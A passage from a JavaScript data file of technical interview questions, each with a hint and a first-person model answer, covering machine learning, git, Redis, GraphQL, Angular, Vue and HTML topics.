      { q:'Explain cross-validation strategies. When do you use stratified k-fold versus time-series cross-validation?', hint:'k-fold: k=5 or 10 folds. Stratified: preserves class distribution per fold - essential for imbalanced data. Time-series CV: forward chaining only (no future data in training). Nested CV for unbiased eval.', answer:`k-fold cross-validation splits data into k equal folds, training on k-1 and testing on the one held out, rotating through all k combinations. The final estimate is the average metric across folds, far more reliable than a single train/test split. Stratified k-fold preserves the class distribution in each fold - essential for imbalanced datasets where a random split might put all minority-class examples in one fold, giving misleadingly high fold scores. For time-series data, standard k-fold is invalid because it allows training on future data to predict past values. Time-series cross-validation uses forward chaining: train on t=1..n, test on t=n+1, then train on t=1..n+1, test on t=n+2, always ensuring the test set is in the future relative to training. Nested cross-validation has an outer loop for model evaluation and an inner loop for hyperparameter tuning, preventing the optimism bias from tuning hyperparameters on the same validation set you report performance on. The computational cost is high but the evaluation is unbiased.` },
      { q:'Explain regularisation techniques in machine learning. When do you use L1 versus L2?', hint:'L1 (Lasso): sparsity, feature selection - drives weights to zero. L2 (Ridge): shrinks weights, rarely zeros. Elastic Net: both. Dropout for neural nets. Early stopping. Stronger regularisation when overfitting.', answer:`Regularisation reduces overfitting by adding a penalty for model complexity to the loss function, discouraging the model from fitting noise in the training data. L2 (Ridge) adds the sum of squared weights to the loss, penalising large weights and pushing them toward zero without eliminating features. It works well when all features are potentially relevant and the goal is weight shrinkage. L1 (Lasso) adds the sum of absolute weights, which drives some weights exactly to zero - performing automatic feature selection. L1 is my choice when I suspect many features are irrelevant and want a sparse, interpretable model. Elastic Net combines L1 and L2 and is robust to correlated features where Lasso behaves erratically. For neural networks, dropout randomly deactivates a fraction of neurons during training, preventing reliance on specific pathways. Batch normalisation reduces covariate shift and has a regularising side effect. Early stopping monitors validation loss and halts training when it begins increasing, preventing the model from continuing to overfit training data. The regularisation strength hyperparameter is tuned via cross-validation.` },
      { q:'How do you deploy a machine learning model to production? What does MLOps involve?', hint:'Package model + preprocessing in Docker. Serve via FastAPI/TensorFlow Serving. Model Registry for versioning. Monitor for data drift and performance degradation. Automated retraining pipeline. CI/CD for ML.', answer:`Deploying ML to production involves concerns that pure development does not: serving latency, throughput, versioning, and ongoing monitoring. For real-time inference, I package the model and its preprocessing pipeline together in a Docker container exposing a REST or gRPC endpoint. FastAPI with a scikit-learn Pipeline object (pickled with joblib) is my default for Python models. Critically, the preprocessing pipeline must be part of the deployed artifact - the same transforms applied at training must run at inference, and serialising the Pipeline ensures this rather than re-implementing transforms manually. A Model Registry (MLflow, SageMaker Model Registry) tracks model versions, their evaluation metrics, and which version is deployed in which environment, enabling rollback when a new model performs worse. Production monitoring detects data drift - when the input feature distribution shifts from what the model was trained on - using tools like Evidently or WhyLogs. When drift is detected or performance degrades below a threshold, a retraining pipeline triggers automatically on fresh data. MLOps applies CI/CD to the ML lifecycle: model training, evaluation, registration, and deployment are all automated and version-controlled.` },
      { q:'How do you explain model predictions? What are SHAP values and when do you use LIME?', hint:'SHAP: game-theory attribution, globally consistent + locally accurate. Waterfall plot per prediction. LIME: local linear approximation around one prediction. PDP for global feature effects. Required in regulated industries.', answer:`Model interpretability matters for debugging, compliance, and stakeholder trust - a model that cannot explain its decisions cannot be debugged or audited. For tree-based models, built-in feature importance (mean decrease in impurity) gives a global view of which features the model relies on, but it does not explain individual predictions and can be misleading for correlated features. SHAP (SHapley Additive exPlanations) provides game-theory-based feature attributions that are both locally accurate (they explain each individual prediction) and globally consistent (they sum correctly to the model output). A SHAP waterfall plot for a credit decision shows exactly which features pushed the score above or below the baseline - applicant's income increased the score by +25, recent late payments decreased it by -40. This is the explanation a compliance officer needs. LIME trains a simple linear model on a perturbed neighbourhood around a specific input, approximating the complex model's local behaviour for that one prediction. It is more approximate than SHAP but useful when SHAP is computationally expensive (large neural networks). Partial Dependence Plots show the marginal effect of one or two features on average predicted outcomes across the training data.` },
    ],
    tensorflow: [
      { q:'What is the difference between TensorFlow 1.x static graphs and TensorFlow 2.x eager execution?', hint:'TF1: build graph then run in session. TF2: eager by default (like PyTorch) - immediate execution, easier debugging.', answer:`TensorFlow 1.x used static computation graphs: you defined the entire computational graph first using symbolic operations, then executed it inside a Session by feeding data through. This gave TF1 performance advantages - the whole graph could be optimised before execution - but made debugging extremely difficult because you could not inspect intermediate values without explicit fetch operations in the session. TensorFlow 2.x switched to eager execution by default, matching PyTorch's approach: operations execute immediately and return concrete values, so you can use standard Python debugging tools, print statements work, and errors point to the exact line. tf.function allows you to decorate a Python function and trace it into a static graph for performance-critical sections, giving the best of both worlds. This made TF2 dramatically more approachable and is why most new TensorFlow code today looks very similar to PyTorch.` },
    ],
    pytorch: [
      { q:'Explain autograd in PyTorch and how it handles backpropagation automatically.', hint:'Dynamic computation graph built on each forward pass. .backward() computes gradients via chain rule. Tensors track grad_fn.', answer:`PyTorch's autograd builds a dynamic computation graph as the forward pass executes - each operation on a tensor with requires_grad=True records itself as a node in the graph along with the tensors it consumed. This graph is built fresh on every forward pass, which is why PyTorch handles variable-length sequences and dynamic architectures naturally. When you call .backward() on a scalar loss, autograd traverses the graph in reverse, applying the chain rule at each node to compute the gradient of the loss with respect to every leaf tensor with requires_grad=True. These gradients accumulate in each parameter's .grad attribute. The optimizer then reads .grad and updates the parameters. I call optimizer.zero_grad() before each forward pass to clear accumulated gradients - forgetting this is a common bug that causes incorrect gradient accumulation across batches.` },
    ],
    figma: [
      { q:'How do you structure a Figma file for a product team of 10+ designers working simultaneously?', hint:'Pages by flow/feature, shared component library, local styles, proper naming conventions, variants for interactive states.', answer:`For large teams, I separate the design file into a dedicated Component Library file and individual feature or flow files that use the library as a linked asset. Within the library, components are organised by category - Atoms, Molecules, Organisms, or by feature area - with descriptive naming that matches the engineering component names to reduce handoff friction. Each component uses variants for interactive states: default, hover, focus, disabled, error. Local styles define the token set - colors, typography, spacing - so a single update propagates everywhere. Feature files use pages per major flow or screen type, with a clear naming convention that matches the engineering routes or user stories. A shared cover page documents the purpose, owners, and last update date. Regular library publish reviews ensure changes are intentional, not accidental, and a clear contribution guide prevents inconsistencies.` },
      { q:'What is the difference between auto layout and regular frames in Figma, and when do you use each?', hint:'Auto layout: responsive, flexbox-like, great for components. Regular frames: fixed layouts, complex multi-column grids.', answer:`Auto layout behaves like CSS flexbox - it arranges children horizontally or vertically, with configurable gap, padding, and alignment. Elements resize and reflow when content changes, making it the right tool for every component that needs to respond to its content: buttons that grow with text, cards that stack vertically, navigation bars. The primary benefit is that designs stay accurate when developers populate them with real data - a button label change does not require manual adjustment of the container. Regular frames with fixed dimensions are appropriate for layouts where the overall canvas size is fixed - a specific screen size, a printed document, a complex multi-column grid where the column structure is the constraint rather than the content. I default to auto layout for all components and most layouts, using fixed frames only when there is a genuine fixed-size constraint.` },
      { q:'How do you handle design tokens and ensure consistency between Figma and the engineering team?', hint:'Figma variables -> exported as JSON -> consumed via style-dictionary or directly in Tailwind/CSS custom properties.', answer:`Design tokens are the single source of truth for values like colors, spacing, typography, and radius. I define them in Figma using Variables (the newer system) or Styles, with a naming structure that mirrors the engineering token hierarchy - for example brand/primary/500 matches the CSS custom property --color-brand-primary-500. Tokens are exported to JSON using the Figma Tokens plugin or the Variables REST API, then consumed by style-dictionary to transform them into platform-specific formats: CSS custom properties, Tailwind config, Swift color assets, Android XML. The workflow is unidirectional - Figma is the source, code consumes it - with a CI step that regenerates the token file when the Figma library updates. This ensures that when a brand color changes, every component in both design and code updates from the same source.` },
    ],
    git: [
      { q:'What is the difference between git rebase and git merge? When do you use each?', hint:'Merge: preserves branch history, creates merge commit. Rebase: rewrites commits onto new base - cleaner history but rewrites SHA. Never rebase shared branches.', answer:`Both integrate changes from one branch into another, but they produce different histories. Merge creates a new merge commit that has two parents, preserving the exact history of when and how branches diverged and rejoined. The history is accurate but can become noisy with many small branches. Rebase replays the commits from the current branch on top of the target branch, producing a linear history as if the work had been done sequentially. This makes git log and bisect much cleaner. My team rule is: rebase before opening a pull request - rebase your feature branch onto main to incorporate the latest changes and linearise history. Once a branch is shared or merged, never rebase it - rewriting commits that others have based work on causes severe merge conflicts and confusion. I use interactive rebase to clean up a messy commit history before review: squashing work-in-progress commits and clarifying commit messages.` },
      { q:'Explain git cherry-pick and a real scenario where you used it.', hint:'Applies a specific commit from one branch to another. Useful for hotfixes: merge fix to main, cherry-pick to release branch.', answer:`Git cherry-pick applies the diff introduced by a specific commit onto the current branch, creating a new commit with the same changes but a different SHA. The most common scenario I use it for is hotfixes: when a critical bug is found in production, I fix it on a hotfix branch off the release tag, merge it to main, then cherry-pick that fix commit onto the current release branch so the fix ships immediately without pulling in unrelated features. Another use case is accidentally committing work to the wrong branch - I cherry-pick the commit onto the correct branch, then revert it from the wrong one. Cherry-pick is a precision tool; for larger integrations with many commits, merge or rebase is more appropriate. When cherry-picking, I note that conflicts are possible if the target branch has diverged significantly, and the original commit remains on its branch unchanged.` },
      { q:'Compare Git Flow and trunk-based development. Which do you prefer and why?', hint:'Git Flow: long-lived branches (feature/develop/release/hotfix), structured releases. Trunk-based: everyone commits to main frequently, feature flags hide incomplete work. TBD for continuous delivery.', answer:`Git Flow uses long-lived branches: main (production), develop (integration), feature branches, release branches, and hotfix branches with specific merge rules between them. It is structured and predictable for teams releasing versioned software on a schedule - library packages, mobile apps with app store review cycles, or games. The tradeoff is complexity: multiple branch types, long-running feature branches that drift from main causing painful merges, and slow integration feedback. Trunk-based development has everyone committing to main (the trunk) multiple times a day, using feature flags to hide incomplete work from users. Integration happens continuously - merge conflicts are caught while they are small, and the main branch is always deployable. This is the model used by teams practicing continuous deployment. I prefer trunk-based development for product teams doing continuous delivery and Git Flow only for library or SDK projects with explicit semantic versioning requirements where release branches genuinely serve a purpose.` },
      { q:'How do you resolve a complex merge conflict? Walk through your approach.', hint:'Understand both sides before touching anything. git log to see what diverged. git diff for full context. Read intent, not just code. Run tests after resolving. Merge conflict in generated files: regenerate.', answer:`My approach starts by understanding both sides before touching any conflicted file. git log --oneline HEAD...MERGE_HEAD shows the commits that diverged and gives context about what each side was trying to accomplish. git diff HEAD...MERGE_HEAD shows the complete diff. For each conflicted file, I read both versions carefully - the HEAD section is my changes, MERGE_HEAD is the incoming changes. I resolve by thinking about the intent of each change, not by mechanically keeping one side. Sometimes the correct resolution combines parts from both: one side added a feature, the other fixed a bug in the same function, and the correct merged version has both. For complex conflicts where I want to start from one side, git checkout --theirs path/to/file or git checkout --ours path/to/file resets a file to one version as a starting point. After resolving all conflicts, I stage the files and run the full test suite before committing - a resolution that passes syntax checks but fails tests is worse than a clear conflict because it silently ships a bug. For generated files like package-lock.json, I accept one side's package.json resolution then re-run npm install to regenerate the lockfile cleanly.` },
      { q:'How does git bisect work and when do you use it?', hint:'Binary search through commit history to find the regression. git bisect start, bisect bad, bisect good. Automated with git bisect run <script>. Finds culprit in log2(N) steps.', answer:`git bisect performs a binary search through commit history to find the commit that introduced a bug. I start with git bisect start, then mark the current state as bad: git bisect bad HEAD. I identify a known good commit: git bisect good v2.1.0. Git checks out the midpoint between bad and good. I test whether the regression exists, then run git bisect bad or git bisect good. Git halves the search space each step - in a history of 1000 commits, bisect finds the culprit in at most 10 steps. For regressions where a test can reliably detect the failure, I automate the search: git bisect run npm test exits 0 for passing (good) and non-zero for failing (bad), and bisect runs fully automatically, checking out each midpoint and running the test. Git points to the exact commit that introduced the regression when done. git bisect reset returns to HEAD. This is my go-to tool for regressions that are difficult to trace by reading code but reproducible by running tests.` },
      { q:'What is git reflog and how do you use it to recover lost work?', hint:'Records every HEAD movement for 90 days. git reflog shows all positions. git checkout SHA or git branch recovery SHA to recover. Survives reset --hard, branch deletion, rebase gone wrong.', answer:`The reflog records every change to HEAD or branch tip over the past 90 days - commits, resets, rebases, checkouts, merges - regardless of whether those commits are still reachable from any branch. This is git's safety net for destructive operations. If I accidentally run git reset --hard and lose commits, git reflog shows every prior position of HEAD with its SHA and a description: HEAD@{2}: commit: add payment validation. I recover the lost commit with git checkout HEAD@{2} to inspect it, or git branch recovery-branch HEAD@{2} to create a branch pointing to it. The reflog also records stash operations and each step of a rebase, so if a rebase goes wrong I can return to the pre-rebase state. git log -g formats reflog output as a regular git log for easier reading. The 90-day retention window means git gc does not immediately clean up recently orphaned commits. The reflog is local - it exists only on your machine - so it cannot recover work from a colleague's deleted remote branch.` },
      { q:'What are Git hooks and how do you enforce code quality with them?', hint:'pre-commit: lint, type check, secret detection. commit-msg: message format. pre-push: run tests. Client hooks: Husky for JS. Server hooks: CI/branch protection are the authoritative gate.', answer:`Git hooks are shell scripts that run automatically at specific points in the workflow. Client-side hooks live in .git/hooks - not version-controlled by default. Teams share them via Husky (JavaScript) or pre-commit (Python), which install hooks from configuration in the repository. The pre-commit hook runs before each commit and is where I enforce fast checks: ESLint and Prettier for formatting, tsc --noEmit for TypeScript type errors, and secret detection (git-secrets or detect-secrets) to prevent API keys from being committed. The commit-msg hook validates commit message format - teams using Conventional Commits use commitlint here to enforce feat:, fix:, chore: prefixes. The pre-push hook runs the full test suite before a push succeeds, catching regressions before they reach the remote. Client-side hooks provide fast feedback during development but can be bypassed with --no-verify. Server-side gates - branch protection rules requiring CI checks to pass before merge - are the authoritative, non-bypassable enforcement. I use both: client-side for developer convenience, server-side as the real gate.` },
      { q:'Compare git submodules and git subtree. When would you use each?', hint:'Submodule: separate repo pointer at specific commit. Clone requires --recurse-submodules. Subtree: merges external repo history directly - no special commands. Prefer package registry for shared libraries.', answer:`Git submodules embed one repository inside another as a reference to a specific commit. The parent repo tracks which commit of the submodule is currently used. Cloning requires git clone --recurse-submodules; updating requires git submodule update --remote. Forgetting to commit the updated submodule pointer after pulling changes is the most common confusion for teams new to submodules. Git subtree merges the external repository's history directly into the parent as a regular directory - contributors clone normally without any special commands, and updates use git subtree pull. The history is merged in, making it heavier but more transparent. In practice, I avoid both for shared libraries: publishing to a package registry (npm, PyPI, Maven) with semantic versioning is far cleaner - teams update via package.json and lock files, not git pointer gymnastics. I use submodules only when the external dependency is not packagable (private tooling, generated assets) or when the team already has established submodule workflows. Subtrees are useful when you want to contribute changes back to the external repo easily via git subtree push.` },
      { q:'How do you sign git commits and why does it matter for security?', hint:'GPG or SSH signing. git config commit.gpgsign true. Public key added to GitHub - shows Verified badge. Branch protection can require signed commits. Prevents trivially forged commit authorship.', answer:`Git commit signing attaches a cryptographic signature to each commit, proving it was made by the holder of a specific private key and has not been tampered with since. GPG signing is the traditional approach: generate a GPG key, configure git with git config --global commit.gpgsign true and git config --global user.signingkey KEYID, and add the public key to GitHub or GitLab. Signed commits display a Verified badge in the web UI. SSH signing (introduced in Git 2.34) uses SSH keys - most developers already have SSH keys configured, making it significantly simpler to set up than GPG. I configure it with git config --global gpg.format ssh and point it at the existing SSH key. I enable commit signing on professional repositories and require it via branch protection rules for main branches in security-sensitive projects. The reason it matters: without signing, the author field in a commit is entirely unverified - anyone can commit as someone@company.com. For supply chain security, verifying that commits on the main branch were genuinely made by authorised team members is a meaningful control.` },
      { q:'How do you use git stash effectively? What are its limitations?', hint:'git stash push: saves WIP without a commit. git stash pop to restore. -m for descriptive name. Stash specific files with -- path. Short-term only - WIP commit on a branch is safer for longer.', answer:`git stash temporarily saves uncommitted changes - both staged and unstaged - to a stack so you can switch context without committing work in progress. git stash push (or just git stash) saves; git stash list shows all stashed changesets; git stash pop applies the most recent and removes it from the stack; git stash apply leaves the stash in the stack for repeated application. I use stash when an urgent review or hotfix requires a branch switch in the middle of feature work: stash, switch, handle the urgent task, switch back, pop. git stash push -m "wip: payment form validation" adds a descriptive message - important when stashes accumulate over a busy day. git stash push -- path/to/file stashes only specific files. Limitations: stashes are local and not backed up remotely. Stashed changes are easy to forget - if you close the terminal and come back tomorrow, a stash without a clear name is a mystery. For anything longer than a few hours, committing as a WIP commit on a branch is safer: it is visible, described, and backed up on the remote. I use stash for minutes-to-an-hour context switches, branches for longer interruptions.` },
    ],
    redis: [
      { q:'What data structures does Redis support and give a use case for each?', hint:'String (cache/counters), List (queues), Set (unique membership), Sorted Set (leaderboards), Hash (objects), HyperLogLog (cardinality).', answer:`Redis provides seven core data structures, each optimal for different patterns. Strings store values up to 512MB - I use them for simple caching with TTL and atomic counters with INCR for rate limiting. Lists are ordered sequences with O(1) push/pop at both ends - ideal for job queues with LPUSH/BRPOP. Sets store unique, unordered members with O(1) membership testing - I use them to track unique visitors or membership in groups. Sorted Sets add a floating-point score to each member, enabling range queries - perfect for leaderboards, rate limit windows, or time-series data with ZADD and ZRANGE. Hashes store field-value pairs for a single key - I use them to cache user session or profile objects, updating individual fields without fetching and rewriting the whole object. HyperLogLog provides approximate cardinality counting with very small memory footprint - useful for unique visitor counts when exact accuracy is not required. Streams, added in Redis 5, provide a persistent append-only log for event sourcing.` },
      { q:'How do you implement a distributed lock using Redis?', hint:'SET key value NX PX timeout (atomic). RedLock algorithm for multi-node Redis. Release lock only if you own it (Lua script for atomicity).', answer:`A distributed lock prevents multiple processes from executing the same critical section simultaneously. The foundational Redis pattern uses a single atomic command: SET lock_key unique_token NX PX 30000 - NX only sets if the key does not exist, PX 30000 sets a 30-second expiry so a crashed process cannot hold the lock forever. The unique token is a UUID generated by the caller. To release, I use a Lua script rather than separate GET then DEL commands, because only the process that holds the lock should release it: the script checks the value matches the caller's token before deleting, and executes atomically. On a single Redis node this is reliable. For multi-node Redis with high availability requirements, the Redlock algorithm acquires the lock on a majority of N independent nodes within a small time window - if a majority respond within the timeout, the lock is acquired. I use the redlock-py or ioredis redlock libraries rather than implementing this from scratch.` },
    ],
    graphql: [
      { q:'What are the key differences between GraphQL and REST APIs? What are the tradeoffs?', hint:'GraphQL: client-specified queries, single endpoint, no over/under-fetching. Tradeoffs: caching complexity, N+1 problem, steeper learning curve.', answer:`GraphQL gives clients precise control over exactly what data they receive - the client specifies the shape of the response in the query, and the server returns exactly that shape. This eliminates over-fetching (receiving fields the client does not need) and under-fetching (needing multiple round trips because one endpoint does not return related data). All queries go to a single endpoint and are self-documenting through the type system. The tradeoffs are real: HTTP caching is straightforward for REST (GET requests are cacheable by URL) but requires extra work for GraphQL since all queries POST to the same endpoint - persisted queries or Apollo CDN help. The N+1 problem is prevalent - resolving a list of items where each item's sub-fields trigger separate database queries - and requires DataLoader to batch-load them. The learning curve is steeper for both server implementation and client tooling. I choose GraphQL for complex, data-rich frontends with multiple consumer types (web, mobile, third-party) and REST for simpler APIs or resource-based microservices.` },
      { q:'How do you solve the N+1 query problem in GraphQL?', hint:'DataLoader: batches and caches calls within a single request. Group individual DB calls into one bulk query per request lifecycle.', answer:`The N+1 problem occurs when a GraphQL query resolves a list of N items and then each item's resolver makes a separate database call for a related field - resulting in 1 query for the list plus N queries for the related data. For a list of 100 posts where each resolver fetches the author separately, that is 101 database queries instead of 2. DataLoader solves this with two mechanisms: batching and caching within a single request lifecycle. Instead of executing immediately, each call to a DataLoader is collected (batched) until the current call stack clears. DataLoader then makes one bulk call - SELECT * FROM users WHERE id IN (...) - with all the requested IDs, and maps the results back to the individual callers. The request-scoped cache ensures that if the same user is referenced by multiple posts in one query, the database call happens only once. I instantiate a fresh DataLoader per request to prevent stale cache hits across requests.` },
    ],
    angular: [
      { q:"What is Angular's change detection strategy and how does OnPush differ from Default?", hint:'Default: checks all components on every event. OnPush: only checks when @Input reference changes, event fires, or async pipe emits. Use OnPush for performance.', answer:`Angular's Default change detection traverses the entire component tree on every browser event, checking whether any binding has changed. OnPush restricts checks to three conditions: an @Input reference changes, an event originates inside the component, or an Observable used with the async pipe emits. By marking performance-critical components as OnPush and using immutable data patterns, I can cut change detection cycles dramatically in large component trees. The tradeoff is that you must be deliberate about triggering detection - mutating an object without replacing its reference will not trigger a check.` },
      { q:'Explain Angular dependency injection. How does the injector hierarchy work?', hint:'Root injector: singleton for whole app. Module/component injectors: scoped instances. @Injectable providedIn. Hierarchical DI - child overrides parent.', answer:`Angular has a hierarchical injector tree: the root injector provides singletons across the entire application, module-level injectors scope to a module's components, and component injectors scope to a component and its children. When a component requests a dependency, Angular walks up the injector tree until it finds a provider or throws an error. I use providedIn: 'root' for application-wide services and component-level providers when I need a fresh instance per component (like a form service). Understanding the hierarchy prevents the common bug of accidentally creating multiple instances of a service that should be a singleton.` },
      { q:'What are RxJS observables and how do you use them in Angular?', hint:'Observable: lazy stream of values. subscribe() to consume. Operators: map, filter, switchMap, mergeMap, combineLatest. Always unsubscribe to prevent memory leaks (takeUntil, async pipe).', answer:`RxJS Observables represent lazy streams of values over time - HTTP responses, user input events, WebSocket messages. Angular's HttpClient returns Observables, and I compose them with operators: switchMap for cancelling previous requests when a new one starts (ideal for search typeahead), forkJoin for parallel requests, combineLatest for merging multiple streams. Preventing memory leaks is critical - I use the async pipe in templates (auto-unsubscribes), or takeUntil(this.destroy$) with a Subject that completes in ngOnDestroy for subscriptions in the component class.` },
      { q:'What is the difference between BehaviorSubject, Subject, and ReplaySubject?', hint:'Subject: hot, no initial value, only future emissions. BehaviorSubject: stores last value, new subscribers get it. ReplaySubject: buffers N past values, replays to new subscribers.', answer:`Subject is a hot observable - subscribers only receive values emitted after they subscribe, with no initial value. BehaviorSubject requires an initial value and always emits the current value to new subscribers immediately, making it ideal for application state like user session or theme. ReplaySubject buffers a specified number of past emissions and replays them to new subscribers, useful when late subscribers must receive recent history. I use BehaviorSubject for shared state in services and Subject for event buses where late subscribers should not receive history.` },
      { q:'How does Angular routing work? Explain lazy loading and route guards.', hint:'RouterModule.forRoot() at app level, forChild() in feature modules. Lazy loading: loadChildren with dynamic import. Guards: CanActivate, CanDeactivate, Resolve.', answer:`Angular Router maps URL paths to components and supports nested routes, query params, and route parameters. Lazy loading splits the bundle so feature modules load on demand: loadChildren: () => import('./feature/feature.module').then(m => m.FeatureModule) keeps the initial bundle small. Route guards control navigation: CanActivate prevents unauthorized access (check auth token, redirect to login), CanDeactivate prompts the user when leaving a dirty form, Resolve pre-fetches data before the component activates. I combine lazy loading with preloading strategies to load secondary routes in the background after the initial page loads.` },
      { q:'What are Angular pipes and when do you create a custom pipe?', hint:'Built-in: date, currency, async, json, uppercase. Custom pipe: implements PipeTransform, pure by default (cached by input). Impure pipes re-run on every change detection cycle.', answer:`Pipes transform display values in templates. Built-in pipes handle formatting (date, currency, percent), transformation (uppercase, json), and async data (async pipe). I create custom pipes when I need reusable, declarative transformations that do not belong in component logic - for example, a pipe that formats a phone number, truncates text at a word boundary, or filters an array. Pure pipes (default) are memoized by Angular and only re-execute when the input reference changes. I avoid impure pipes in performance-sensitive templates because they run on every change detection cycle.` },
      { q:'How do you handle forms in Angular - Template-driven vs Reactive forms?', hint:'Template-driven: ngModel, simple forms. Reactive: FormBuilder, FormControl, FormGroup in component class - better for complex validation and dynamic fields.', answer:`Template-driven forms use ngModel directives in the template and are simple to set up for basic use cases, but they are hard to test and difficult to add dynamic validation to. Reactive forms define the form model in the component class using FormBuilder, FormGroup, and FormControl, making them fully testable, easier to unit test, and better suited for dynamic forms where fields are added or removed at runtime. I use reactive forms by default: AbstractControl validators enable complex cross-field validation, and valueChanges Observable lets me react to form input with debounceTime and distinctUntilChanged for things like live search.` },
    ],
    vue: [
      { q:'What is the difference between Vue 3 Composition API and Options API?', hint:'Options API: data/methods/computed/watch properties - familiar but logic scattered. Composition API: setup() or <script setup>, composables group related logic together - better for large components and reuse.', answer:`The Options API organizes code by option type (data, methods, computed, watch), which is intuitive for small components but scatters related feature logic across different sections as components grow. The Composition API (setup() or <script setup> in Vue 3) groups logic by feature using composable functions, making complex components readable and enabling code reuse without mixins. I prefer the Composition API with <script setup> syntax for all new Vue 3 work - it is more concise, type-safe with TypeScript, and enables extracting stateful logic into composable functions like useAuth() or useInfiniteScroll() that are testable in isolation.` },
      { q:'Explain Vue 3 reactivity. How does ref() differ from reactive()?', hint:'ref(): wraps primitives and objects, access via .value. reactive(): deep reactive proxy for objects, no .value needed. ref is preferred for primitives; reactive for objects but loses reactivity when destructured.', answer:`Vue 3 uses JavaScript Proxy under the hood to track property reads (track) and writes (trigger) on reactive objects. ref() wraps any value in a reactive container accessed via .value - Vue auto-unwraps refs in templates so .value is unnecessary there. reactive() creates a deep reactive proxy for objects and is convenient for complex state, but it loses reactivity when destructured. I use ref() for primitives and individual values, and reactive() sparingly for closely related state that is always accessed together. computed() derives reactive values from reactive state and caches until dependencies change.` },
      { q:'What is Pinia and how does it compare to Vuex?', hint:'Pinia: Vue 3 official state manager. No mutations (direct state modification). TypeScript-first. Modular stores with defineStore. Vuex: boilerplate-heavy, requires mutations for state changes.', answer:`Pinia is Vue's official state management library for Vue 3, replacing Vuex. It eliminates Vuex's mandatory mutations - state is modified directly in actions, which dramatically reduces boilerplate. Each store is defined with defineStore() and can hold state, getters (computed), and actions (sync or async). Pinia has first-class TypeScript support and integrates with Vue DevTools. Compared to Vuex, Pinia stores are smaller, easier to understand, and composable - actions can use other stores directly. I migrate Vuex stores to Pinia in Vue 3 projects because the developer experience is significantly better.` },
      { q:'How does Vue component communication work - props, emits, and provide/inject?', hint:'Props: parent -> child (one-way). Emits: child -> parent events. provide/inject: ancestor -> deep descendant (avoid prop drilling). Composables for shared reactive state.', answer:`Props pass data downward from parent to child - they are read-only in the child component to maintain unidirectional data flow. When a child needs to notify a parent, it emits a custom event with defineEmits and the parent listens with v-on. Provide/inject passes data from an ancestor to any descendant without prop drilling through intermediate components - I use it for theme data or authentication context that many nested components need. For complex cross-component state, I use a Pinia store rather than deeply nested provide/inject, since the store is explicit and DevTools-visible.` },
      { q:'What is Vue Router and how do you implement navigation guards?', hint:'createRouter with history/hash mode. Nested routes, dynamic segments (:id). Guards: beforeEach (global), beforeEnter (per-route), onBeforeRouteLeave (component). Lazy loading with dynamic import.', answer:`Vue Router maps URLs to components and supports nested routes, dynamic segments, named routes, and programmatic navigation. Navigation guards intercept route transitions: router.beforeEach() runs before every navigation for global concerns like authentication checks, per-route beforeEnter handles route-specific logic, and onBeforeRouteLeave in the component confirms before leaving a dirty form. Lazy loading with () => import('./views/Dashboard.vue') splits routes into separate chunks, keeping the initial bundle small. I also use router.meta to attach role requirements to routes and check them in a global beforeEach guard.` },
      { q:'Explain Vue 3 lifecycle hooks and when you use them.', hint:'onMounted: DOM ready, start data fetching. onUpdated: after re-render. onBeforeUnmount / onUnmounted: cleanup (event listeners, intervals). watchEffect for reactive side effects.', answer:`Vue 3 lifecycle hooks run at specific points: onBeforeMount/onMounted fire when the component is inserted into the DOM - I fetch initial data in onMounted. onUpdated fires after reactive state changes cause a DOM re-render - rarely used directly. onBeforeUnmount/onUnmounted are critical for cleanup: clearing intervals, removing non-Vue event listeners, and cancelling pending network requests to prevent memory leaks and state updates on unmounted components. watchEffect runs a function reactively, re-running whenever its dependencies change, and is cleaner than watch for side effects that simply track reactive state.` },
      { q:'How do you optimise a Vue application for performance?', hint:'v-once for static content. v-memo to skip re-renders. keep-alive for expensive component caching. Lazy route loading. shallowRef/shallowReactive for large lists. Vue DevTools performance profiler.', answer:`Key Vue performance techniques: lazy-load routes with dynamic imports to reduce initial bundle size; use v-once for content that never changes after initial render; wrap expensive frequently-toggled components in keep-alive to cache their state instead of destroying and recreating them. For large lists, use virtual scrolling (vue-virtual-scroller) to render only visible items. Use shallowRef or shallowReactive for large arrays or objects where deep reactivity is not needed. The Vue DevTools performance tab shows component render times and helps identify components that re-render unnecessarily - the fix is usually more specific watchers or component decomposition.` },
    ],
    html: [
      { q:'What is semantic HTML and why does it matter for accessibility and SEO?', hint:'Semantic elements (header, main, nav, article, section, aside, footer) convey meaning. Screen readers use them. Search engines weight them. Non-semantic divs/spans convey nothing.', answer:`Semantic HTML uses elements that describe their content's meaning rather than just its appearance - <header>, <nav>, <main>, <article>, <section>, <aside>, <footer> replace generic <div> tags. Screen readers and assistive technologies use semantic structure to build a navigation outline for users with visual impairments. Search engines use semantic markup to understand content hierarchy and relevance. I always use semantic elements for page structure, <button> for clickable actions, <a> for navigation, and <table> only for tabular data - each choice communicates intent that CSS and JavaScript classes cannot.` },
      { q:'Explain the difference between block, inline, and inline-block elements.', hint:'Block: full width, new line (div, p, h1). Inline: width of content, no new line (span, a, strong). Inline-block: inline flow + block sizing. display property controls this.', answer:`Block elements (div, p, h1-h6, section) start on a new line and stretch to fill their container's full width by default. Inline elements (span, a, strong, em) flow within text, only taking as much width as their content, and height/width properties have no effect on them. Inline-block elements behave like inline elements in the document flow but respect width, height, margin, and padding like block elements - useful for navigation items or grid cells that need sizing but should flow horizontally. The CSS display property overrides any element's default - display: none removes it from layout entirely while visibility: hidden hides it but preserves its space.` },
      { q:'What are HTML5 APIs and which have you used in projects?', hint:'localStorage/sessionStorage, Canvas, Web Workers, Geolocation, WebSockets, Drag and Drop, History API, Notifications API, Intersection Observer.', answer:`HTML5 introduced browser APIs that dramatically reduced reliance on third-party plugins. I regularly use localStorage and sessionStorage for client-side persistence, the Canvas API for charts and image manipulation, the Intersection Observer API for implementing lazy loading and infinite scroll efficiently without polling, and the History API for single-page application routing. The Geolocation API is straightforward for location-aware features. Web Workers run CPU-intensive tasks off the main thread, preventing UI freezes. I choose APIs based on browser support requirements and always implement graceful fallbacks for unsupported environments.` },
      { q:'How do you make an HTML form accessible and handle validation properly?', hint:'Label for every input (for= or aria-labelledby). fieldset/legend for groups. required, pattern, min/max for native validation. aria-describedby for error messages. Focus management.', answer:`Every form input needs an associated label - either a <label for="id"> or aria-labelledby - so screen readers announce what the field is. I use fieldset and legend to group related inputs like radio buttons. HTML5 native validation attributes (required, pattern, min, max, type="email") provide instant, accessible validation without JavaScript. For custom validation, I set aria-invalid="true" on invalid inputs and link error messages via aria-describedby so screen readers announce the error. I manage focus - moving it to the first error after a failed form submission helps keyboard and screen reader users understand what to fix.` },
